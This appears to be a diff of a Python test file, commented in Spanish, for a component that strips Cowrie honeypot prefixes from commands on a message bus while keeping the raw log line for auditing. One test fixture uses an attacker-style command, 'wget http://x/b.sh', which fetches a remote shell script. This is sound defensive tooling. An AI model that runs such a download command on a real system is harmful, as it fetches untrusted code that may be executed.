@@ -2,9 +2,8 @@
 
 Cowrie escribe el comando en la línea del registro con un prefijo que no tipeó nadie: `CMD: ` en
 los eventos de entrada y `Command found: ` o `Command not found: ` en los de resultado. El pipeline
-lo recorta desde el arreglo del 10/09, pero el bus retiene lo publicado antes: en ese momento eran
-3.338 mensajes de 71.654, y cada uno haría que el motor razone sobre el prefijo como si fuera parte
-de lo que el atacante ejecutó.
+lo recorta, pero el bus puede retener mensajes publicados sin ese recorte, y cada uno haría que el
+motor razone sobre el prefijo como si fuera parte de lo que el atacante ejecutó.
 
 Lo que se fija acá es el recorte y, sobre todo, que el mensaje original sobreviva en `crudo`. Si el
 saneamiento pisara la evidencia, después no habría con qué auditar qué llegó del bus.
@@ -46,7 +45,7 @@ def test_recorta_los_tres_prefijos() -> None:
 
 
 def test_no_toca_un_comando_limpio() -> None:
-    """Lo que ya viene bien pasa sin cambios, que es el caso normal desde el arreglo."""
+    """Lo que ya viene bien pasa sin cambios, que es el caso normal."""
     assert EventoDelBus.desde_mensaje("0-1", _mensaje("wget http://x/b.sh")).command == (
         "wget http://x/b.sh"
     )
@@ -65,8 +64,8 @@ def test_recorta_solo_al_principio() -> None:
 def test_recorta_una_sola_vez() -> None:
     """Un prefijo repetido deja el segundo a la vista en lugar de esconderlo.
 
-    Nunca lo vimos en el bus, y justamente por eso conviene que se note: si apareciera, es una
-    señal de que el pipeline duplicó el recorte, no algo para tapar en silencio.
+    El pipeline no lo produce, y justamente por eso conviene que se note: si aparece, es una señal
+    de que el pipeline duplicó el recorte, no algo para tapar en silencio.
     """
     evento = EventoDelBus.desde_mensaje("0-1", _mensaje("CMD: CMD: uname -a"))
     assert evento.command == "CMD: uname -a"
